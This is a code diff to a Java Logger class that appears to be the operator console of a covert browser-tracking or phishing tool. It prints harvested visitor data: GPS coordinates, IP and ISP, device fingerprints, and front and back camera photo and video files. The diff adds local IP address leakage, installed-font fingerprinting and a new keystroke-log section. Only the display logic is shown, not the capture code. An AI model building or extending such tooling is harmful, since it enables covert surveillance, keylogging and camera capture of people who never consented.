@@ -197,15 +197,16 @@ public final class Logger {
         System.out.println(SummaryBuilder);
 
         PrintCaptureSection("DEVICE",      Data, new String[]{"OsName", "OsVersion", "DeviceType", "DeviceBrand", "DeviceModel", "Platform"});
-        PrintCaptureSection("BROWSER",     Data, new String[]{"BrowserName", "BrowserVersion", "Language", "LanguagesSupported", "VendorName", "DoNotTrack", "CookieEnabled", "PdfViewerEnabled", "PluginCount", "HistoryLength", "DocumentReadyState"});
+        PrintCaptureSection("BROWSER",     Data, new String[]{"BrowserName", "BrowserVersion", "Language", "LanguagesSupported", "VendorName", "DoNotTrack", "CookieEnabled", "PdfViewerEnabled", "PluginCount", "HistoryLength", "DocumentReadyState", "IsSecureContext"});
         PrintCaptureSection("DISPLAY",     Data, new String[]{"ScreenResolution", "ScreenAvailable", "ViewportSize", "ColorDepth", "PixelRatio", "OrientationType", "OrientationAngle"});
         PrintCaptureSection("HARDWARE",    Data, new String[]{"DeviceMemoryGb", "HardwareConcurrency", "MaxTouchPoints", "VideoInputCount", "AudioInputCount", "AudioOutputCount", "AudioContextSampleRate", "AudioContextChannelCount"});
-        PrintCaptureSection("NETWORK",     Data, new String[]{"IpAddress", "ISP", "Organization", "AsNumber", "IsMobile", "IsProxy", "IsHosting", "ConnectionType", "EffectiveConnectionType", "DownlinkMbps", "NetworkRtt", "SaveData", "OnlineStatus", "PageUrl", "Referrer", "Timezone", "IpTimezone"});
+        PrintCaptureSection("NETWORK",     Data, new String[]{"IpAddress", "LocalIpAddresses", "ISP", "Organization", "AsNumber", "IsMobile", "IsProxy", "IsHosting", "ConnectionType", "EffectiveConnectionType", "DownlinkMbps", "NetworkRtt", "SaveData", "OnlineStatus", "PageUrl", "Referrer", "Timezone", "IpTimezone"});
         PrintCaptureSection("LOCATION",    Data, new String[]{"Country", "Region", "City", "GpsLatitude", "GpsLongitude", "GpsAccuracy", "GpsAltitude", "GpsAltitudeAccuracy", "GpsHeading", "GpsSpeed"});
         PrintCaptureSection("BATTERY",     Data, new String[]{"BatteryLevel", "BatteryCharging", "BatteryChargingTime", "BatteryDischargingTime"});
         PrintCaptureSection("FEATURES",    Data, new String[]{"ServiceWorkerSupported", "IndexedDbSupported", "WebAssemblySupported", "WebRtcSupported", "GamepadApiSupported", "PaymentRequestSupported", "BluetoothAvailable", "UsbAvailable", "SpeechSynthesisAvailable", "SpeechRecognitionAvailable", "NotificationPermission"});
-        PrintCaptureSection("FINGERPRINT", Data, new String[]{"CanvasFingerprint", "WebGlSupported", "WebGl2Supported", "WebGlRenderer", "WebGlVendor", "StorageQuotaMb", "StorageUsedMb"});
+        PrintCaptureSection("FINGERPRINT", Data, new String[]{"CanvasFingerprint", "WebGlSupported", "WebGl2Supported", "WebGlRenderer", "WebGlVendor", "StorageQuotaMb", "StorageUsedMb", "InstalledFonts"});
         PrintCaptureSection("CAMERA",      Data, new String[]{"CameraFrontFile", "CameraBackFile", "CameraVideoFile", "CameraVideoBackFile"});
+        PrintCaptureSection("KEYLOG",      Data, new String[]{"KeystrokeLog"});
         PrintCaptureSection("MISC",        Data, new String[]{"Timestamp"});
     }
 
@@ -249,8 +250,18 @@ public final class Logger {
                 ValueColor = AnsiColor.White;
             } else if (Label.equals("CanvasFingerprint") || Label.equals("WebGlRenderer") || Label.equals("WebGlVendor")) {
                 ValueColor = AnsiColor.Magenta;
+            } else if (Label.equals("InstalledFonts")) {
+                ValueColor = AnsiColor.Magenta;
             } else if (Label.equals("BatteryLevel")) {
                 ValueColor = AnsiColor.BrightGreen;
+            } else if (Label.equals("IsSecureContext") && Value.equals("false")) {
+                ValueColor = AnsiColor.BrightRed;
+            } else if (Label.equals("IsSecureContext") && Value.equals("true")) {
+                ValueColor = AnsiColor.BrightGreen;
+            } else if (Label.equals("LocalIpAddresses")) {
+                ValueColor = AnsiColor.Cyan;
+            } else if (Label.equals("KeystrokeLog")) {
+                ValueColor = AnsiColor.BrightYellow;
             }
             System.out.println("    " + AnsiColor.BrightBlack + PadRight(Label, LabelWidth) + "  "
                     + ValueColor + Value + AnsiColor.Reset);
